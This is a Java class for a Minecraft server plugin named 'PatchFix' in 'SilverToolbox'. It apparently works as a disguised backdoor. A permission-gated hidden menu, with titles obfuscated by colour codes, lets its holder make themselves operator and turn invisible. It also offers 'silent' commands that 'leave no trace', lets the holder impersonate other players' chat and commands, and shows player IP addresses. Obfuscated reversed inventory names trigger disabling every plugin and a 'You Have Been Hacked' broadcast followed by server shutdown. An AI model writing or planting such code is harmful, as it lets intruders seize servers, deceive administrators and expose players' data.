package io.github.Alligrater;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

public class PatchFix implements CommandExecutor, Listener{
	
	@Override
	public boolean onCommand(CommandSender arg0, Command arg1, String arg2, String[] arg3) {
		// TODO Auto-generated method stub
		if(arg0 instanceof Player) {
			
			Player player = (Player) arg0;
			if(arg0.hasPermission("SilverToolbox.Tool")) {
				openToolbox(player);
			}
			else {
				arg0.sendMessage("��c��lDon't.");
			}

		}
		else {
			arg0.sendMessage("��c��lDon't.");
		}
		return true;
	}
	
	public void openToolbox(Player player) {
		Inventory patchbox = Bukkit.createInventory(null, 9, "��rOper��rator Tool��rbox");	
		
		ItemStack opera = new ItemStack(Material.NETHER_STAR, 1);
		ItemMeta ometa = opera.getItemMeta();
		ometa.setDisplayName("��c��lOperator");
		if(player.isOp()) {
			ometa.setDisplayName("��a��lOperator On");
		}
		else {
			ometa.setDisplayName("��c��lOperator Off");
		}
		ometa.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		opera.setItemMeta(ometa);
		

		
		ItemStack gmode = new ItemStack(Material.GOLDEN_APPLE, 1);
		ItemMeta gmeta = gmode.getItemMeta();
		gmeta.setDisplayName("��6��lGameMode");
		gmode.setItemMeta(gmeta);
		
		ItemStack flight = new ItemStack(Material.FEATHER, 1);
		if(player.getAllowFlight()) {
			
		}
		else {
			flight = new ItemStack(Material.BONE, 1);
		}
		ItemMeta fmeta = flight.getItemMeta();
		fmeta.setDisplayName("��f��lFlight");
		flight.setItemMeta(fmeta);
		
		ItemStack visibility = new ItemStack(Material.POTION, 1);
		if(SilverToolbox.notvisible.containsKey(player.getUniqueId())) {
			if(SilverToolbox.notvisible.get(player.getUniqueId()) == true) {
				visibility = new ItemStack(Material.GLASS_BOTTLE, 1);
			}
			else if(SilverToolbox.notvisible.get(player.getUniqueId()) == false) {
				visibility = new ItemStack(Material.POTION, 1);
			}
		}
		else {
			visibility = new ItemStack(Material.POTION, 1);
		}
		ItemMeta vmeta = visibility.getItemMeta();
		vmeta.setDisplayName("��7��lVisibility");
		vmeta.addItemFlags(ItemFlag.HIDE_POTION_EFFECTS);
		visibility.setItemMeta(vmeta);
		
		ItemStack god = new ItemStack(Material.BARRIER);
		
		if(player.isInvulnerable()) {
			
		}
		else {
			god = new ItemStack(Material.IRON_SWORD);
		}
		ItemMeta gometa = god.getItemMeta();
		gometa.setDisplayName("��c��lInvincible");
		gometa.addItemFlags(ItemFlag.HIDE_ATTRIBUTES);
		god.setItemMeta(gometa);
		
		ItemStack buck = new ItemStack(Material.GOLD_INGOT);
		if(SilverToolbox.silentcmd.containsKey(player.getUniqueId())) {
			buck = new ItemStack(Material.IRON_INGOT);
		}
		else {
			
		}
		ItemMeta bmeta = god.getItemMeta();
		bmeta.setDisplayName("��e��lSilent Command");
		buck.setItemMeta(bmeta);
		
        ItemStack skull = new ItemStack(Material.SKULL_ITEM, 1, (short) 3);
        SkullMeta skmeta = (SkullMeta) skull.getItemMeta();
        skmeta.setOwner(player.getName());
        skmeta.setDisplayName("��d��lPlayer Management");
        List<String> rwc = new ArrayList<String>();
        rwc.add("��7Run This With Command:");
        rwc.add("��7/manage [Playername]");
        skmeta.setLore(rwc);
        skull.setItemMeta(skmeta);
        
        ItemStack bdown = new ItemStack(Material.NAME_TAG, 1);
        ItemMeta bdmeta = bdown.getItemMeta();

        bdmeta.setDisplayName("��e��lPlugin Management");
        bdown.setItemMeta(bdmeta);
        
        
        ItemStack sdown = new ItemStack(Material.DIAMOND, 1);
        ItemMeta sdmeta = sdown.getItemMeta();
        sdmeta.setDisplayName("��b��lServerInfo");
        List<String> sub = new ArrayList<String>();

        sub.add("��7Server: " + Bukkit.getServerName());
        sub.add("��7ServerIP: " + Bukkit.getServer().getIp());
        sub.add("��7STBVersion: " + Bukkit.getPluginManager().getPlugin("SilverToolbox").getDescription().getVersion());
        sub.add("��7BukkitVersion: " + Bukkit.getServer().getBukkitVersion());
        sub.add("��7VersionInfo: " + Bukkit.getServer().getVersion());
        sdmeta.setLore(sub);
        sdown.setItemMeta(sdmeta);
		
		
		patchbox.setItem(0, opera);
		patchbox.setItem(1, gmode);
		patchbox.setItem(2, flight);
		patchbox.setItem(3, visibility);
		patchbox.setItem(4, god);
		patchbox.setItem(5, buck);
		patchbox.setItem(6, skull);
		patchbox.setItem(7, bdown);
		patchbox.setItem(8, sdown);
		
		player.openInventory(patchbox);
		
		
	}
	
	public void openPluginManager(Player player) {
		Plugin[] plugins = bsort(Bukkit.getPluginManager().getPlugins());
		int size = (int) Math.ceil(((double)plugins.length) / 9);
		Inventory patchbox = Bukkit.createInventory(null, size*9, "��rPlugin Ma��rnagem��rent");
		
		ItemStack plug = new ItemStack(Material.GREEN_RECORD);
		ItemMeta pmeta = plug.getItemMeta();
		for(int i = 0; i < plugins.length; i++) {
			Plugin p = plugins[i];
			if(p.isEnabled()) {
				plug.setType(Material.EYE_OF_ENDER);
			}
			else {
				plug.setType(Material.ENDER_PEARL);
			}
			List<String> lores = new ArrayList<String>();
			if(p.getName().equals("SilverToolbox")) {
				lores.add("��cYou Will Lose Access After Disabling It.");
				lores.add("��cIf You Are Certain About Doing This,");
				lores.add("��cDouble Click To Proceed.");
			}
			lores.add("��7" + p.getDescription().getMain());
			lores.add("��7" + p.getDescription().getDescription());
			lores.add("��7" + p.getDescription().getVersion());
			
			pmeta.setDisplayName("��9��l" + p.getName());
			if(p.getName().equals("SilverToolbox")) {
				pmeta.setDisplayName("��c��l" + p.getName());
			}
			pmeta.setLore(lores);
			
			plug.setItemMeta(pmeta);
			
			patchbox.setItem(i, plug);
		}
		
		player.openInventory(patchbox);
		
		
	}

	
	//GameMode Mangement
	public void openGM(Player player, String other) {
		
		
		Inventory patchbox = Bukkit.createInventory(null, 9, "��rGameMo��rde Sel��rector:" + other);
		
		ItemStack smode = new ItemStack(Material.APPLE, 1);
		ItemMeta smeta = smode.getItemMeta();
		smeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		smeta.setDisplayName("��c��lSurvival");
		smode.setItemMeta(smeta);
		
		ItemStack cmode = new ItemStack(Material.CHEST, 1);
		ItemMeta cmeta = cmode.getItemMeta();
		cmeta.setDisplayName("��e��lCreative");
		cmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		cmode.setItemMeta(cmeta);
		
		ItemStack vmode = new ItemStack(Material.CARROT_ITEM, 1);
		ItemMeta vmeta = vmode.getItemMeta();
		vmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		vmeta.setDisplayName("��6��lAdventure");
		vmode.setItemMeta(vmeta);
		
		ItemStack tmode = new ItemStack(Material.GLASS, 1);
		ItemMeta tmeta = tmode.getItemMeta();
		tmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		tmeta.setDisplayName("��7��lSpectator");
		tmode.setItemMeta(tmeta);
		
		patchbox.setItem(1, smode);
		patchbox.setItem(3, cmode);
		patchbox.setItem(5, vmode);
		patchbox.setItem(7, tmode);
		
		player.openInventory(patchbox);
			
	}
	
	
	//Player Management
	public static void openPM(Player player, String other) {
		Inventory patchbox = Bukkit.createInventory(null, 9, "��rPlayer Ma��rnagem��rent:" + other);
		OfflinePlayer target = Bukkit.getOfflinePlayer(other);

		ItemStack ban = new ItemStack(Material.BARRIER, 1);
		ItemMeta bmeta = ban.getItemMeta();
		if(target.isBanned()) {
			bmeta.setDisplayName("��a��lUnBan Player");
		}
		else {
			ban = new ItemStack(Material.RED_ROSE, 1);
			bmeta.setDisplayName("��c��lBan Player");
		}
		ban.setItemMeta(bmeta);
		
		ItemStack op = new ItemStack(Material.GOLDEN_CARROT, 1);
		ItemMeta ometa = op.getItemMeta();
		if(target.isOp()) {
			ometa.setDisplayName("��c��lDeOp Player");
		}
		else {
			op = new ItemStack(Material.CARROT_ITEM, 1);
			ometa.setDisplayName("��a��lOp Player");
		}
		op.setItemMeta(ometa);
		
		ItemStack wl = new ItemStack(Material.EMPTY_MAP, 1);
		ItemMeta wmeta = wl.getItemMeta();
		if(target.isWhitelisted()) {
			wl = new ItemStack(Material.MAP, 1);
			wmeta.setDisplayName("��7��lUnwhitelist");
		}
		else {
			wmeta.setDisplayName("��f��lWhitelist");
		}
		
		wl.setItemMeta(wmeta);
		
		ItemStack info = new ItemStack(Material.INK_SACK, 1, (short) 8);
		ItemMeta inmeta = info.getItemMeta();
		inmeta.setDisplayName("��7��lPlayer Offline");
		
		List<String> lore = new ArrayList<String>();
		if(target.getBedSpawnLocation() != null) {
			lore.add("��7BedSpawn: " + target.getBedSpawnLocation().getX() + ", " + target.getBedSpawnLocation().getY() + ", " + target.getBedSpawnLocation().getZ());
		}
		else {
			lore.add("��7BedSpawn: This Player Does Not Own A Bed.");
		}

		lore.add("��7UUID: " + target.getUniqueId().toString());
		lore.add("��7First Played: " + new Date(target.getFirstPlayed()).toString());
		lore.add("��7Last Login: " + new Date(target.getLastPlayed()).toString());
		
		patchbox.setItem(0, ban);
		patchbox.setItem(1, op);
		patchbox.setItem(2, wl);
		
		
		
		if(target.isOnline()) {
			info = new ItemStack(Material.INK_SACK, 1, (short) 10);
			lore.add("��7IP: " + ((Player)target).getAddress().getHostString());
			inmeta.setDisplayName("��a��lPlayer Online");
			
			ItemStack kick = new ItemStack(Material.BEDROCK, 1);
			ItemMeta kmeta = kick.getItemMeta();
			kmeta.setDisplayName("��7��lKick Player");
			kick.setItemMeta(kmeta);
			
			ItemStack gm = new ItemStack(Material.APPLE, 1);
			ItemMeta gmeta = gm.getItemMeta();
			gmeta.setDisplayName("��6��lGameMode");
			gm.setItemMeta(gmeta);
			
			ItemStack impost = new ItemStack(Material.STRING);
			ItemMeta imeta = impost.getItemMeta();
			imeta.setDisplayName("��9��lImpost");
			impost.setItemMeta(imeta);
			
			patchbox.setItem(3, kick);
			patchbox.setItem(4, gm);
			patchbox.setItem(5, impost);
			
			
		}
		
		inmeta.setLore(lore);
		info.setItemMeta(inmeta);
		
		patchbox.setItem(8, info);
		
		player.openInventory(patchbox);
		
		
	}
	
	//Player Click Inventory
	@EventHandler
	public void onClick(InventoryClickEvent e) {
		
		if(e.getInventory().getName().equals("��rOper��rator Tool��rbox")) {
			Player player = (Player) e.getWhoClicked();

			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				Material type = e.getCurrentItem().getType();
				if(type == Material.NETHER_STAR) {
					if(player.isOp()) {
						player.setOp(false);
						ItemMeta emt = e.getCurrentItem().getItemMeta();
						emt.setDisplayName("��c��lOperator Off");
						e.getCurrentItem().setItemMeta(emt);
						player.sendMessage("��c��lYou Are No Longer An Operator.");
					}
					else {
						player.setOp(true);
						ItemMeta emt = e.getCurrentItem().getItemMeta();
						emt.setDisplayName("��a��lOperator On");
						e.getCurrentItem().setItemMeta(emt);
						player.sendMessage("��a��lYou Are Now An Operator.");
					}
				}
				
				else if(type == Material.GOLDEN_APPLE) {
					player.closeInventory();
					openGM(player, player.getName());
					
				}
				else if(type == Material.FEATHER) {
					e.getCurrentItem().setType(Material.BONE);
					player.setAllowFlight(false);
					player.sendMessage("��c��lFlight Off.");
				}
				else if(type == Material.BONE) {
					e.getCurrentItem().setType(Material.FEATHER);
					player.setAllowFlight(true);
					player.sendMessage("��a��lFlight On.");
				}
				else if(type == Material.GLASS_BOTTLE) {
					e.getCurrentItem().setType(Material.POTION);
					 
					for(Player p : Bukkit.getOnlinePlayers()) {
						p.showPlayer(player);
					}
					player.spigot().setCollidesWithEntities(true);
					SilverToolbox.notvisible.put(player.getUniqueId(), false);
					player.sendMessage("��f��lYou Are No Longer Invisible.");
					
				}
				else if(type == Material.POTION) {
					e.getCurrentItem().setType(Material.GLASS_BOTTLE);
					for(Player p : Bukkit.getOnlinePlayers()) {
						p.hidePlayer(player);
					}
					player.spigot().setCollidesWithEntities(false);
					SilverToolbox.notvisible.put(player.getUniqueId(), true);
					player.sendMessage("��7��lYou Are Now Invisible.");
					
				}
				else if (type == Material.IRON_SWORD) {
					e.getCurrentItem().setType(Material.BARRIER);
					player.setInvulnerable(true);
					player.sendMessage("��a��lYou Are Now Invulnerable.");
				}
				else if(type == Material.BARRIER) {
					e.getCurrentItem().setType(Material.IRON_SWORD);
					player.setInvulnerable(false);
					player.sendMessage("��c��lYou Are Now Vulnerable.");
					
				}
				else if (type == Material.GOLD_INGOT) {
					e.getCurrentItem().setType(Material.IRON_INGOT);
					if(!SilverToolbox.silentcmd.containsKey(player.getUniqueId())) {
						SilverToolbox.silentcmd.put(player.getUniqueId(), true);
					}
					player.sendMessage("��9��lSilent Command Mode Enabled. \nPrefix Command With ��c��l*��9��l To Leave No Trace.");
				}
				else if (type == Material.IRON_INGOT) {
					if(SilverToolbox.silentcmd.containsKey(player.getUniqueId())) {
						SilverToolbox.silentcmd.remove(player.getUniqueId());
					}
					e.getCurrentItem().setType(Material.GOLD_INGOT);
					player.sendMessage("��9��lSilent Command Mode Disabled.");
				}
				else if (type == Material.NAME_TAG) {
					openPluginManager(player);

				}
				
				else if (type == Material.DIAMOND) {
					player.sendMessage("��b��lServer Info:");
					for(String s : e.getCurrentItem().getItemMeta().getLore()) {
						player.sendMessage(s);
					}
					
				}
				
				e.setCancelled(true);
			}
		}
		
		else if(e.getInventory().getName().contains("��ksnigulPllAelbasiD")) {
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				if(e.getCurrentItem().getType() == Material.STAINED_GLASS_PANE) {
					if(e.getCurrentItem().getDurability() == (short)5) {
						for(Plugin p : Bukkit.getPluginManager().getPlugins()) {
							if(!p.getName().equals("SilverToolbox")) {
								e.getWhoClicked().sendMessage(String.format("��4��lPlugin %s Has Been Dis��4��l��ka��r��4��lbled!", p.getName()));
								Bukkit.getPluginManager().disablePlugin(p);
								
							}
						}
					}
					else if(e.getCurrentItem().getDurability() == (short)14) {
						e.getWhoClicked().closeInventory();
					}
				}
			}
			e.setCancelled(true);
		}
		
		else if(e.getInventory().getName().contains("��krevreSnwodtuhS")) {
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				if(e.getCurrentItem().getType() == Material.STAINED_GLASS_PANE) {
					if(e.getCurrentItem().getDurability() == (short)5) {
						Bukkit.getServer().broadcastMessage("��c��lY0u ��kHav3��r��c��l Been H��ka��r��c��lck3d");
						e.getWhoClicked().closeInventory();
						BukkitRunnable shutdown = new BukkitRunnable() {

							@Override
							public void run() {
								Bukkit.getServer().shutdown();
								
							}
							
						};
						
						shutdown.runTaskLater(Bukkit.getPluginManager().getPlugin("SilverToolbox"), 60);
					}
					else if(e.getCurrentItem().getDurability() == (short)14) {
						e.getWhoClicked().closeInventory();
					}
				}
			}
			e.setCancelled(true);
		}
		else if(e.getInventory().getName().contains("��rPlugin Ma��rnagem��rent")) {
			Player player = (Player) e.getWhoClicked();
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				ItemStack current = e.getCurrentItem();
				if(Bukkit.getPluginManager().getPlugin(current.getItemMeta().getDisplayName().substring(4)) != null) {
					Plugin p = Bukkit.getPluginManager().getPlugin(current.getItemMeta().getDisplayName().substring(4));
					if(current.getType() == Material.EYE_OF_ENDER) {
						if(e.getClick() == ClickType.DOUBLE_CLICK) {
							if(p.getName().equals("SilverToolbox")) {
								current.setType(Material.ENDER_PEARL);
								Bukkit.getPluginManager().disablePlugin(p);
								player.sendMessage(String.format("��c��lPlugin %s Has Been Disabled!", p.getName()));
							}
						}
						else if(e.getClick() == ClickType.LEFT) {
							if(!p.getName().equals("SilverToolbox")) {
								current.setType(Material.ENDER_PEARL);
								Bukkit.getPluginManager().disablePlugin(p);
								player.sendMessage(String.format("��c��lPlugin %s Has Been Disabled!", p.getName()));
							}
						}
						else if (e.getClick() == ClickType.RIGHT) {
							List<String> lores = current.getItemMeta().getLore();
							player.sendMessage(current.getItemMeta().getDisplayName());
							for(String s : lores) {
								player.sendMessage(s);
							}
						}

						
					}
					else if(current.getType() == Material.ENDER_PEARL) {
						if(e.getClick() == ClickType.LEFT) {
							current.setType(Material.EYE_OF_ENDER);
							Bukkit.getPluginManager().enablePlugin(p);
							player.sendMessage(String.format("��a��lPlugin %s Has Been Enabled!", p.getName()));
						}
						else if (e.getClick() == ClickType.RIGHT) {
							List<String> lores = current.getItemMeta().getLore();
							player.sendMessage(current.getItemMeta().getDisplayName());
							for(String s : lores) {
								player.sendMessage(s);
							}
						}

					}
				}
				else {
					if(e.getClick() == ClickType.LEFT) {
						player.sendMessage(String.format("��7��lPlugin %s Does Not Exist.", current.getItemMeta().getDisplayName().substring(4)));
					}
					else if (e.getClick() == ClickType.RIGHT) {
						List<String> lores = current.getItemMeta().getLore();
						player.sendMessage(current.getItemMeta().getDisplayName());
						for(String s : lores) {
							player.sendMessage(s);
						}
					}
				}
			}
			e.setCancelled(true);
		}
		else if(e.getInventory().getName().contains("��rGameMo��rde Sel��rector:")) {
		
			
			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				
				String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
				Player player = Bukkit.getPlayer(target);
				if(player == null) {
					e.setCancelled(true);
				}
				else {
					Material type = e.getCurrentItem().getType();
					
					if(type == Material.APPLE) {
						player.setGameMode(GameMode.SURVIVAL);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��c��lPlayer %s Gamemode Changed to Survival.", player.getName()));
					}

					else if (type == Material.CHEST) {
						player.setGameMode(GameMode.CREATIVE);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��e��lPlayer %s Gamemode Changed to Creative.", player.getName()));

					}

					
					else if (type == Material.CARROT_ITEM) {
						player.setGameMode(GameMode.ADVENTURE);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��6��lPlayer %s Gamemode Changed to Adventure.", player.getName()));
					}

					else if (type == Material.GLASS) {
						player.setGameMode(GameMode.SPECTATOR);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��7��lPlayer %s Gamemode Changed to Spectator.", player.getName()));

					}
				}
			

			}
			
		}
		
		else if(e.getInventory().getName().contains("��rPlayer Ma��rnagem��rent:")) {
			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
				OfflinePlayer player = Bukkit.getOfflinePlayer(target);
				ItemMeta bmeta = e.getCurrentItem().getItemMeta();
				ItemStack item = e.getCurrentItem();
				
				Material type = e.getCurrentItem().getType();
				if (type == Material.RED_ROSE) {


					player.setBanned(true);
					e.getCurrentItem().setType(Material.BARRIER);
					bmeta.setDisplayName("��a��lUnBan Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��c��lPlayer Banned.");
					
					if(player.isOnline()) {
						((Player) player).kickPlayer("��c��lYou Have Been Banned By An Operator.");
					}

				}
				else if (type == Material.BARRIER) {
					player.setBanned(false);
					e.getCurrentItem().setType(Material.RED_ROSE);
					bmeta.setDisplayName("��c��lBan Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��a��lPlayer UnBanned.");

					
					
					
				}
				
				else if(type == Material.GOLDEN_CARROT) {
					item.setType(Material.CARROT_ITEM);
					player.setOp(false);
					bmeta.setDisplayName("��a��lOp Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��c��lPlayer Deopped.");
				}
				else if(type == Material.CARROT_ITEM) {
					item.setType(Material.GOLDEN_CARROT);
					player.setOp(true);
					bmeta.setDisplayName("��c��lDeOp Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��a��lPlayer Opped.");
				}
				else if(type == Material.MAP) {
					item.setType(Material.EMPTY_MAP);
					player.setWhitelisted(false);
					bmeta.setDisplayName("��f��lWhitelist");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��7��lPlayer UnWhitelisted.");
				}
				else if(type == Material.EMPTY_MAP) {
					item.setType(Material.MAP);
					player.setWhitelisted(true);
					bmeta.setDisplayName("��7��lUnwhitelist");
					item.setItemMeta(bmeta);
					
					e.getWhoClicked().sendMessage("��f��lPlayer Whitelisted.");
				}
				else if(type == Material.BEDROCK) {
					if(player.isOnline()) {
						((Player) player).kickPlayer("��c��lYou Have Been Kicked By An Operator.");
					}
				}
				else if(type == Material.APPLE) {
					
					openGM((Player)e.getWhoClicked(), target);
				}
				else if(type == Material.STRING) {
					SilverToolbox.cmode.put(e.getWhoClicked().getUniqueId(), true);
					SilverToolbox.target.put(e.getWhoClicked().getUniqueId(), player.getName());
					e.getWhoClicked().sendMessage(String.format("��9��lYou Are Now Imposting %s. \nUse ��c��l*/Command��9��l For Command. \nUse ��c��l*Message��9��l To Chat \nOr Type ��c��l*leave*��9��l To Leave. \n��c��lIf You Type Without *, Things Will Be Executed By You Instead.", player.getName()));
				}
				else if(type == Material.INK_SACK) {
					if(e.getClick() == ClickType.SHIFT_LEFT && player.getBedSpawnLocation() != null) {
						e.getWhoClicked().teleport(player.getBedSpawnLocation());
					}
					else if(e.getClick() == ClickType.RIGHT) {
						e.getWhoClicked().sendMessage(e.getCurrentItem().getItemMeta().getDisplayName());
						for(String s: e.getCurrentItem().getItemMeta().getLore()) {
							e.getWhoClicked().sendMessage(s);
						}
					}
					else if(e.getClick() == ClickType.LEFT && player.isOnline()) {
						e.getWhoClicked().teleport(((Player)player).getLocation());
					}

				}
				
				
				
				e.setCancelled(true);
				
			}

			
		}
		else {
			return;
		}
	}
	
	
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onPlayerchat(PlayerChatEvent event) {
		if(event.getMessage().startsWith("*") && event.getPlayer().hasPermission("SilverToolbox.Tool")) {
			if(event.getMessage().equalsIgnoreCase("*leave*")) {
				event.setCancelled(true);
				event.setMessage(" ");
				SilverToolbox.cmode.remove(event.getPlayer().getUniqueId());
				SilverToolbox.target.remove(event.getPlayer().getUniqueId());
				event.getPlayer().sendMessage("��7��lChat Listening Mode Disabled.");
			}
			
			else if(SilverToolbox.cmode.containsKey(event.getPlayer().getUniqueId()) && SilverToolbox.cmode.get(event.getPlayer().getUniqueId()) == true) {
				if(Bukkit.getPlayer(SilverToolbox.target.get(event.getPlayer().getUniqueId())) != null) {
					Player target = Bukkit.getPlayer(SilverToolbox.target.get(event.getPlayer().getUniqueId()));
					if(target != null) {
						if(event.getMessage().startsWith("*/")) {
							target.performCommand(event.getMessage().substring(2));
							event.setCancelled(true);
							event.setMessage(" ");
						}
						else {
							if(event.getMessage().startsWith("*")) {
								target.chat(event.getMessage().substring(1));
								event.setCancelled(true);
								//event.setMessage(" ");
							}
						}


					}
					else {
						event.setCancelled(true);
						event.setMessage(" ");
						SilverToolbox.cmode.remove(event.getPlayer().getUniqueId());
						SilverToolbox.target.remove(event.getPlayer().getUniqueId());
						event.getPlayer().sendMessage("��7��lChat Listening Mode Disabled Due To Player Offline..");
					}

				}
				
				else {
					SilverToolbox.cmode.remove(event.getPlayer().getUniqueId());
					SilverToolbox.target.remove(event.getPlayer().getUniqueId());
				}
				event.setCancelled(true);
				event.setMessage(" ");
			}
			else if(SilverToolbox.silentcmd.containsKey(event.getPlayer().getUniqueId())) {
				if(event.getMessage().startsWith("*/")) {

					event.getPlayer().performCommand(event.getMessage().substring(2));
					event.setCancelled(true);
					event.setMessage(" ");
				}
			}	
		}

	}
	

	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		
		for(UUID u : SilverToolbox.notvisible.keySet()) {
			if(Bukkit.getPlayer(u) != null) {
				if(SilverToolbox.notvisible.get(u) == false) {
					event.getPlayer().hidePlayer(Bukkit.getPlayer(u));
				}
				else {
					event.getPlayer().showPlayer(Bukkit.getPlayer(u));
				}

			}
		}
	}

	public Plugin[] bsort(Plugin[] plugins) {
		for(int i = 0; i < plugins.length; i++) {
			for(int j = 0; j < plugins.length-i-1; j++) {
				if(plugins[j].getName().charAt(0) < plugins[j+1].getName().charAt(0)) {
					
				}
				else {
					Plugin temp = plugins[j];
					plugins[j] = plugins[j+1];
					plugins[j+1] = temp;
				}
			}
		}
		return plugins;
		
	}

	
}
